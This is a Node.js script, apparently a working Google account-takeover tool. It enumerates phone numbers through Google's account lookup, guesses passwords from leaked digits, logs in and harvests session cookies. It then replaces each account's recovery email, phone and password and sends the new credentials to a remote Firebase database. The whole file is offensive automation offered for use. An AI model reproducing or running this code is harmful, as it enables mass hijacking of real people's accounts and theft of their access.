const puppeteer = require('puppeteer')
const admin = require('./database')
const request = require('request')
const crypto = require('crypto')
const fs = require('fs')

let SERVER = 'server'
let COUNTRY = null
let CODE = null

require('events').EventEmitter.prototype._maxListeners = 100

let database = new admin()

let mServerData = null
let mHostGPS = null
let page = null
let mRecovery = null
let mReloadPage = false
let mTokenSearch = false
let mToken = null

let mTimeToken = null
let mMultiPol = 0

let signIn = 'https://accounts.google.com/v3/signin/identifier?dsh=S486911370%3A1660878859035702&continue=https%3A%2F%2Fmyaccount.google.com%2Fphone&flowEntry=ServiceLogin&flowName=GlifWebSignIn&followup=https%3A%2F%2Fmyaccount.google.com%2Fphone&hl=en&osid=1&passive=1209600&service=accountsettings&ifkv=AQN2RmXi5hQ0UNg2WdE-Q0uN6EkRajDJS8t2hGYrxhAUzrUw9wzthNS-fBecP-ZTszEMzP8_Je0p'

fs.copyFile('redirect.js', 'node_modules/request/lib/redirect.js', (err) => {
    if(!err) {
        fs.copyFile('NavigatorWatcher.js', 'node_modules/puppeteer/lib/NavigatorWatcher.js', (err) => {
            if(!err) {
                process.argv.slice(2).forEach(function (val, index) {
                    if (index === 0) {
                        SERVER = 'server'+val
                        database.connect((error) => {
                            if(!error) {
                                request({
                                    url: 'https://raiyan-088-default-rtdb.firebaseio.com/raiyan/code/server/'+SERVER+'.json',
                                    json:true
                                }, function(error, response, body){
                                    if(!(error || body == null)) {
                                        CODE = body['code']
                                        COUNTRY = body['name']
                                        mServerData = body
                                        console.log('start browser')
                                        browserStart()
                                    }
                                })
                            }
                        })
                    }
                })
            }
        })
    }
})


async function browserStart() {
    ;(async () => {

        mRecovery = JSON.parse(fs.readFileSync('./recovery.json'))

        let browser = await puppeteer.launch({
            headless: true,
            args: [ '--no-sandbox', '--disable-setuid-sandbox' ]
        })
    
        page = await browser.newPage()
    
        await page.setUserAgent('Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36')

        await page.setRequestInterceptionEnabled(true)
    
        page.on('request', async req => {
            if(req.url.startsWith('https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=V1UmUe') && req.method == 'POST') {
                mToken = req.postData
                req.abort()
                await delay(100)
                page.goBack()
                await delay(500)
                mTokenSearch = false
            } else {
                req.continue()
            }
        })

        await page.goto(signIn)
        
    
        let cookie = await page.cookies()

        cookie.forEach(function (value) {
            if (value.name == '__Host-GAPS') {
                mHostGPS = value.value
            }
        })

        if(mHostGPS == null) mHostGPS = '1:bJ6IzDkUblOirycmWnLX29tiwNVKNg:EO4prJJbfARXxVTU'
        
        let length = parseInt(mServerData['length'])
        let index = length == 8 ? 2 : length == 9 || length == 10 ? 3 : length == 11 ? 4 : 5
        mMultiPol = Math.pow(10, length - index)
        
        for(let key of Object.keys(mServerData)) {
            if(key.startsWith('start')) {
                let runing = 'runing'+key.replace('start', '')
                let start = mServerData[key]
                let number = mServerData[runing]
                if(number == null) {
                    number = start * mMultiPol
                }
                if(number != 0) {
                    //if(key == 'start_1') {
                        checkNumber(number, runing, start, 0)
                    //}
                }
            }
        }
        
    })()
}


function checkNumber(number, name, start, runing) {
    runing++
    let temp = runing
    if(temp >= 50) {
        console.log('Check: '+number)
        database.set('/code/server/'+SERVER+'/'+name, number)
        temp = 0
    }
    if(parseInt(start)+1 <= parseInt(number/mMultiPol)) {
        database.set('/code/server/'+SERVER+'/'+name, 0)
    } else {
        request({
            url: 'https://accounts.google.com/_/lookup/accountlookup?hl=en&_reqid=999999',
            method: 'POST',
            body: getNumberTempData(CODE+number),
            headers: {
                'content-type' : 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf' : 1
            }
        }, function(error, responce, body) {
            try {
                let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
                if(data[0][1] == 16) {
                    console.log('Found: '+data[0][4])
                    logInNumber(number, data[0][4].replace(/[^0-9]/g, ''), name, start, temp)
                } else {
                    checkNumber(number+1, name, start, temp)
                }
            } catch (e) {
                checkNumber(number+1, name, start, temp)
            }
        })
    }
}


async function logInNumber(number, password, name, start, runing) {
    ;(async () => {
        if(!mReloadPage) {
            let Identifier = await getIdentifierData(CODE+number)
            
            request({
                url: 'https://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute?rpcids=V1UmUe',
                method: 'POST',
                body: Identifier,
                headers:  {
                    'X-Goog-Ext-278367001-Jspb': '["GlifWebSignIn"]',
                    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
                    'Cookie': '__Host-GAPS='+mHostGPS
                }
            }, function(error, response, body) {
                let check = false
                try {
                    if (!error) {
                        let temp = JSON.parse(body.substring(body.indexOf('[['), body.length))
                        if(temp[0][2].includes('/v3/signin/rejected')) {
                            check = true
                            ;(async () => {
                                console.log('Reload Page')
                                mReloadPage = true
                                await page.goto(signIn)
                                mReloadPage = false
                                logInNumber(number, password, name, start, runing)
                            })()
                        } else {
                            let data = JSON.parse(temp[0][2])
                            if(data.length >= 22) {
                                let out = data[21][1][0][1]
                                if(!(out[0][1] == null || out[1][1] == null)) {
                                    check = true
                                    passwordTry(password, out[1][1], out[0][1], null, 0, 0, number, name, start, runing)
                                }
                            }
                        }
                    } else {}
                } catch (e) {}
                
                if(!check) {
                    console.log('H-Captcha Found')
                    checkNumber(number+1, name, start, runing)
                }
            })
        } else {
            await delay(1000)
            logInNumber(number, password, name, start, runing)
        }
    })()
}

function passwordTry(password, TL, type, sendCookies, again, loop, number, name, start, runing) {
    let pass = password
    if(loop == 1) {
        pass = password.substring(0, 8)
    } else if(loop == 2) {
        pass = password.substring(password.length-8, password.length)
    }

    request({
        url: 'https://accounts.google.com/_/signin/challenge?hl=en&TL='+TL+'&_reqid=999999',
        method: 'POST',
        body: getPasswordData(pass, parseInt(type)),
        headers: {
            'Cookie': again==1?'__Host-GAPS='+mHostGPS+'; '+sendCookies:'__Host-GAPS='+mHostGPS,
            'content-type' : 'application/x-www-form-urlencoded;charset=UTF-8',
            'google-accounts-xsrf' : 1
        }
    }, function(error, responce, body) {

        let output = 0

        if(again == 0) {
            try {
                let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
                if(data[0][3] == 5) {
                    if(password.length > 8) {
                        if(loop == 0) {
                            output = 1
                            passwordTry(password, TL, type, null, 0, 1, number, name, start, runing)
                        } else if(loop == 1) {
                            output = 1
                            passwordTry(password, TL, type, null, 0, 2, number, name, start, runing)
                        } else if(loop == 2) {
                            console.log('Matching Faild')
                        }
                    }
                } else if(data[0][3] == 3) {
                    let temp = number.toString()
                    let index = temp.length == 8 ? 2 : temp.length == 9 || temp.length == 10 ? 3 : temp.length == 11 ? 4 : 5
                    console.log('Password Matching')
                    database.set('/code/gmail/found/'+COUNTRY+'/'+temp.substring(0, index)+'/'+temp.substring(index, temp.length), loop)
                } else if(data[0][3] == 1) {
                    console.log('Login Success')
                    let cookiesList = responce.headers['set-cookie']
                    if(cookiesList) {
                        output = 2
                        getRaptToken(pass, cookiesList, number, name, start, runing)
                    }
                }
            } catch (e) {}
        } else if(again == 1) {
            try {
                let data = JSON.parse(body.substring(body.indexOf('[['), body.length))
                if(data[0][3] == 1) {
                    output = 2
                    let url = decodeURIComponent(data[0][13][2])
                    let index = url.indexOf('rapt=')
                    let split = url.substring(index+5, url.length).split('&')
                    let mRAPT = split[0]
                    
                    request({
                        url: 'https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fmyaccount.google.com%2Fintro%2Fpersonal-info',
                        method: 'GET',
                        headers: {
                            'Cookie': sendCookies,
                            'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
                        }
                    }, function(error, responce, body) {
                        let wrong = true
                        try {
                            if(!error && responce.headers['location']) {
                                let url = decodeURIComponent(responce.headers['location'])  
                                let index = url.indexOf('osidt=')
                                let split = url.substring(index+6, url.length).split('&')
                                let tempCookes = sendCookies
                                tempCookes += 'OSID=Lgh3m_XDdCpAmGim5eO6xW8csVs0m9rLO6I7FHHeiGEViTAiQK_GhRhgeVwISYbsIeMp1g.; '
                                wrong = false
                                request({
                                    url: 'https://myaccount.google.com/accounts/SetOSID?continue=https%3A%2F%2Faccounts.youtube.com%2Faccounts%2FSetSID%3Fssdc%3D1&osidt='+split[0],
                                    method: 'GET',
                                    headers: {
                                        'Cookie': tempCookes
                                    }
                                }, function(error, responce, body) {
                                    wrong = true
                                    try {
                                        if(!error && responce.headers['set-cookie']) {
                                            cookiesList = responce.headers['set-cookie']
        
                                            for(let i=0; i<cookiesList.length; i++) {
                                                let singelData = cookiesList[i]
                                                try {
                                                    let start = singelData.indexOf('=')
                                                    let end = singelData.indexOf(';')
                                                    let key = singelData.substring(0, start)
                                                    if(key == 'OSID') {
                                                        sendCookies += 'OSID='+singelData.substring(start+1, end)
                                                        i = cookiesList.length
                                                    }
                                                } catch (e) {}
                                            }

                                            wrong = false
                                            if(mTimeToken != null) {
                                                prvpChange(sendCookies, mRAPT, loop, number, name, start, runing)
                                            } else {
                                                request({
                                                    url: 'https://myaccount.google.com/phone',
                                                    method: 'GET',
                                                    headers: {
                                                        'Cookie': sendCookies,
                                                        'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
                                                    }
                                                }, function(error, response, body) {
                                                    try {
                                                        if(!error) {
                                                            let index = body.indexOf('SNlM0e')
                                                            if(index != -1) {
                                                                let temp = body.substring(index+6, index+100)
                                                                mTimeToken = temp.substring(temp.indexOf(':')+1, temp.indexOf(',')).replace('"', '').replace('"', '').replace(' ', '')
                                                                database.set('/server/time', mTimeToken)
                                                            }
                                                        }
                                                    } catch (e) {}

                                                    if(mTimeToken != null) {
                                                        prvpChange(sendCookies, mRAPT, loop, number, name, start, runing)
                                                    } else {
                                                        request({
                                                            url: 'https://raiyan-088-default-rtdb.firebaseio.com/raiyan/server/time.json',
                                                            method: 'GET',
                                                            json: true
                                                        }, function(error, response, body) {
                                                            try {
                                                                if(!error) {
                                                                    mTimeToken = body
                                                                }
                                                            } catch (e) {}

                                                            if(mTimeToken != null) {
                                                                prvpChange(sendCookies, mRAPT, loop, number, name, start, runing)
                                                            } else {
                                                                database.set('/code/gmail/menually/'+COUNTRY+'/'+number.toString(), loop)
                                                                checkNumber(number+1, name, start, runing)
                                                            }
                                                        })
                                                    }
                                                })
                                            }
                                        }
                                    } catch (e) {}

                                    if(wrong) {
                                        database.set('/code/gmail/menually/'+COUNTRY+'/'+number.toString(), loop)
                                        checkNumber(number+1, name, start, runing)
                                    }
                                })
                            }
                        } catch (e) {}

                        if(wrong) {
                            database.set('/code/gmail/menually/'+COUNTRY+'/'+number.toString(), loop)
                            checkNumber(number+1, name, start, runing)
                        }
                    })
                }
            } catch (e) {}
        }

        if(output == 0) {
            checkNumber(number+1, name, start, runing)
        }
    })
}

function getRaptToken(password, cookiesList, number, name, start, runing) {
    let sendCookies = ''
    
    for(let i=0; i<cookiesList.length; i++) {
        let singelData = cookiesList[i]
        try {
            let start = singelData.indexOf('=')
            let end = singelData.indexOf(';')
            let key = singelData.substring(0, start)
            if(key == 'SID' || key == '__Secure-1PSID' || key == 'HSID' || key == 'SSID' || key == 'SAPISID' || key == 'LSID' || key == 'APISID') {
                let value = singelData.substring(start+1, end)
                sendCookies += key+'='+value+'; '
            }
        } catch (e) {}
    }

    request({
        url: 'https://myaccount.google.com/signinoptions/rescuephone',
        method: 'GET',
        headers: {
            'Cookie': sendCookies,
            'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
        }
    }, function(error, response, body) {
        let check = false
        try {
            if (!error) {
                let headers = response.headers
                if(headers && headers['location']) {
                    check = true
                    let index = headers['location'].indexOf('rart=')
                    let split = headers['location'].substring(index, headers['location'].length).split('&')
                    request({
                        url: 'https://accounts.google.com/ServiceLogin?'+split[0],
                        method: 'GET',
                        headers: {
                            'Cookie': sendCookies,
                            'User-Agent' : 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
                        }
                    }, function(error, response, body) {
                        let check = false
                        try {
                            if (!error) {
                                let headers = response.headers
                                 if(headers && headers['location']) {
                                    check = true
                                    let index = headers['location'].indexOf('TL=')
                                    let split = headers['location'].substring(index+3, headers['location'].length).split('&')
                                    cookiesList = headers['set-cookie']
                                    for(let i=0; i<cookiesList.length; i++) {
                                        let singelData = cookiesList[i]
                                        try {
                                            let start = singelData.indexOf('=')
                                            let end = singelData.indexOf(';')
                                            let key = singelData.substring(0, start)
                                            if(key == '__Host-GAPS') {
                                                mHostGPS = singelData.substring(start+1, end)
                                                i = cookiesList.length
                                            }
                                        } catch (e) {}
                                    }
                                    passwordTry(password, split[0], split[split.length-1].replace('cid=', ''), sendCookies, 1, 0, number, name, start, runing)
                                }
                            } else {}
                        } catch (e) {}
                        
                        if(!check) {
                            checkNumber(number+1, name, start, runing)
                        }
                    })
                }
            } else {}
        } catch (e) {}
        
        if(!check) {
            checkNumber(number+1, name, start, runing)
        }
    })
}

function prvpChange(sendCookies, mRAPT, loop, number, name, start, runing) {
    request({
        url: 'https://drive.google.com/drive/mobile/my-drive',
        method: 'GET',
        headers: {
            'Cookie': sendCookies
        }
    }, function(error, response, body) {
        let wrong = true
        try {
            if(!error) {
                let index = body.indexOf('__initData')
                if(index != -1) {
                    let temp = body.substring(index, body.length)
                    let data = JSON.parse(temp.substring(temp.indexOf('['), temp.indexOf(';</script>')))
                    
                    let mGmail = data[0][9][35][2].replace('@gmail.com', '').replace('.', '')
                    let mCreate = parseInt(data[0][9][11][9]/1000)

                    let position = Math.floor((Math.random() * (mRecovery.length-1)))
                    let recovery = mRecovery[position]
                    wrong = false

                    request({
                        url: 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=uc1K4d&rapt='+mRAPT,
                        method: 'POST',
                        body: getRecoveryData(recovery+'@gmail.com'),
                        headers: {
                            'Cookie': sendCookies,
                            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
                        } 
                    }, function(error, response, body) {
                        wrong = true
                        try {
                            if(!(error || body.includes('"er"'))) {
                                wrong = false
                                request({
                                    url: 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=GWdvgc&rapt='+mRAPT,
                                    method: 'POST',
                                    body: getVerificationData(),
                                    headers: {
                                        'Cookie': sendCookies,
                                        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
                                    }
                                }, function(error, response, body) {
                                    wrong = true
                                    try {
                                        if(!(error || body.includes('"er"'))) {
                                            wrong = false
                                            request({
                                                url: 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=ZBoWob&rapt='+mRAPT,
                                                method: 'POST',
                                                body: getPhoneData(CODE+number),
                                                headers: {
                                                    'Cookie': sendCookies,
                                                    'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
                                                }
                                            }, function(error, response, body) {
                                                wrong = true
                                                try {
                                                    if(!(error || body.includes('"er"'))) {
                                                        wrong = false
                                                        let changePass = getRandomPassword()
                                                        request({
                                                            url: 'https://myaccount.google.com/_/AccountSettingsUi/data/batchexecute?rpcids=or64jf&rapt='+mRAPT,
                                                            method: 'POST',
                                                            body: getChangePasswordData(changePass),
                                                            headers: {
                                                                'Cookie': sendCookies,
                                                                'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
                                                            }
                                                        }, function(error, response, body) {
                                                            wrong = true
                                                            try {
                                                                if(!(error || body.includes('"er"'))) {
                                                                    wrong = false
                                                                    console.log(changePass)
                                                                    database.update('/code/gmail/completed/'+COUNTRY+'/'+mGmail, { create:mCreate, number:number, password:changePass, recovery:recovery})
                                                                    console.log('Completed Process')
                                                                    checkNumber(number+1, name, start, runing)
                                                                }
                                                            } catch (e) {}
                                                            if(wrong) {
                                                                database.set('/code/gmail/menually/'+COUNTRY+'/'+number.toString(), loop)
                                                                checkNumber(number+1, name, start, runing)
                                                            }
                                                        })
                                                    }
                                                } catch (e) {}
                                                if(wrong) {
                                                    database.set('/code/gmail/menually/'+COUNTRY+'/'+number.toString(), loop)
                                                    checkNumber(number+1, name, start, runing)
                                                }
                                            })
                                        }
                                    } catch (e) {}
                                    if(wrong) {
                                        database.set('/code/gmail/menually/'+COUNTRY+'/'+number.toString(), loop)
                                        checkNumber(number+1, name, start, runing)
                                    }
                                })
                            }
                        } catch (e) {}
                        if(wrong) {
                            database.set('/code/gmail/menually/'+COUNTRY+'/'+number.toString(), loop)
                            checkNumber(number+1, name, start, runing)
                        }
                    })
                }
            }
        } catch (e) {}

        if(wrong) {
            database.set('/code/gmail/menually/'+COUNTRY+'/'+number.toString(), loop)
            checkNumber(number+1, name, start, runing)
        }
    })
}

function getNumberTempData(number) {
    let freq = [number,"AEThLlzLnodznP_eS7-mfzAihkXlpSKvoxliHZlPZE7W1-NMXK50YUORqG5WNyxwLONQwZwBsK1p-PH7BHW4s-NEZhzTMrxrdQHlqhB6bpzNema_MyohPW-JaUv-EO7_qbvIYnlKdIu0JkSGy2tJbRiElFWhzHXi1UJK1nt4D8UbHnOux-lF7PC0_RlISAgrI1oOSktxWO1I",[],null,null,null,null,2,false,true,[null,null,[2,1,null,1,"https://accounts.google.com/ServiceLogin?service=accountsettings&hl=en-US&continue=https%3A%2F%2Fmyaccount.google.com%2Fphone&csig=AF-SEnY7bxxtADWhtFc_%3A1556625798&flowName=GlifWebSignIn&flowEntry=ServiceLogin",null,[],4,[],"GlifWebSignIn",null,[],false],1,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,true,null,null,null,null,null,null,null,null,[]],number,null,null,null,true,true,[]]
    return 'f.req='+encodeURIComponent(JSON.stringify(freq))+'&bgRequest='+encodeURIComponent(JSON.stringify(["identifier",getIdentifier()]))
}


function getPasswordData(password, type) {
    return 'continue='+encodeURIComponent('https://myaccount.google.com/')+'&service=accountsettings&f.req='+encodeURIComponent(JSON.stringify(['AEThLlw5uc06cH1q8zDfw1uY4Xp7eNORXHjsuJT-9-2nFsiykmQD7IcKUJPcYmG4KddhkjoTup4nzB0yrSZeYwm7We09VV6f-i34ApnWRsbGJ2V1tdbWPwWOgK4gDGSgJEJ2hIK9hyGgV-ejHBA-mCWDXqcePqHHag5bc4lHSHRGyNrOr9Biuyn6y8tk3iCBn5IY34f-QKm5-SOxrbYWDcto50q0oo2z0YCPFtY556fWL0DY0W0pAGKmW6Ky4ukssyF91aMhKyZsH5bzHEs0vPdnYAWfxipSCarZjBUB0TIR7W2MyATWD99NE0xXQAIy2AGgdxdyi9aYhS7sjH1iUhbjspK_di8Wn1us7BfEbjaXI0BA4SXy7igdq53U5lKmR1seyx6mpKnVKK59iCNyWzZOa8y91Q06DdD0OqQHaPmK2g6S2PH6j6CsOsBRGVxcvjnzysjfgf7bARU0CgFDOAwA8Q8fKOaqBIe0Xg3nfHILRWVBJnVqUpI',null,type,null,[1,null,null,null,[password,null,true]]]))+'&bgRequest='+encodeURIComponent(JSON.stringify(["identifier",'Hi, Google Team. My name is Raiyan. You want contact me? It is my mail adress raiyanhossain088@gmail.com']))
}

function getRecoveryData(gmail) {
    return 'f.req='+encodeURIComponent(JSON.stringify([[["uc1K4d","[\"ac.sirerq\",\""+gmail+"\",null,true]",null,"generic"]]]))+'&at='+encodeURIComponent(mTimeToken)
}

function getVerificationData() {
    return 'f.req=%5B%5B%5B%22GWdvgc%22%2C%22%5B%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+encodeURIComponent(mTimeToken)
}

function getPhoneData(number) {
    return 'f.req='+encodeURIComponent(JSON.stringify([[["ZBoWob","[[3,\""+number+"\",null,null,[1],null,null,null,null,null,[],1]]",null,"generic"]]]))+'&at='+encodeURIComponent(mTimeToken)
}

function getChangePasswordData(password) {
    return 'f.req='+encodeURIComponent(JSON.stringify([[["or64jf","[\""+password+"\",null,false]",null,"generic"]]]))+'&at='+encodeURIComponent(mTimeToken)
}


function getIdentifier() {
    let data = ''
    let loop = Math.floor(Math.random() * 15)+15
    for(let i=0; i<loop; i++) {
        data = data+crypto.randomBytes(20).toString('hex')
    }
    return data
}

async function getIdentifierData(num) {
    let number = num
    let getToken = null
    while(true) {
        if(getToken != null) {
            break
        }
        if(!mTokenSearch) {
            mToken = null
            mTokenSearch = true
            await page.evaluate((number) => { 
                let root = document.querySelector('input[type="email"]')
                if(root) {
                    root.value = number
                    return true
                }
                return false
            }, number)

            await page.evaluate(() => document.querySelector('#identifierNext').click())
        } else {
            if(mToken != null) {
                getToken = mToken
                mToken = null
                break
            }
            await delay(500)
        }
    }
    return getToken
}

async function getIdentifierToken(number) {
    if(page != null) {
        return await page.evaluate(async (number) => {
            let root = document.querySelector('#Email')
            if(root) {
                root.value = number
                try {
                    return document.bg.low(function(response) {
                        return response
                    })
                } catch (err) {
                    root.value = ''
                }
            }
            return null
        }, number)
    } else {
        return null
    }
}


function getRandomPassword() {
    let C = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
    let S = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    let N = ['0','1','2','3','4','5','6','7','8','9']
    let U = ['#','$','@']
    
    let pass = C[Math.floor((Math.random() * 26))]
    pass = pass+ S[Math.floor((Math.random() * 26))]
    pass = pass+ S[Math.floor((Math.random() * 26))]
    pass = pass+ S[Math.floor((Math.random() * 26))]
    pass = pass+ S[Math.floor((Math.random() * 26))]
    pass = pass+ N[Math.floor((Math.random() * 10))]
    pass = pass+ N[Math.floor((Math.random() * 10))]
    pass = pass+ N[Math.floor((Math.random() * 10))]
    pass = pass+ U[Math.floor((Math.random() * 3))]
    pass = pass+ U[Math.floor((Math.random() * 3))]
    
    return pass
}

function delay(time) {
    return new Promise(function(resolve) { 
        setTimeout(resolve, time)
    })
}

async function click(id) {
    let output = await page.evaluate((id) => {
        let root = document.querySelector(id)
        if(root) {
            root.click()
            return true
        } else {
            return false
        }
    }, id)
    return output
}

async function exits(id) {
    let output = await page.evaluate((id) => {
        let root = document.querySelector(id)
        if(root) {
            return true
        } else {
            return false
        }
    }, id)
    return output
}
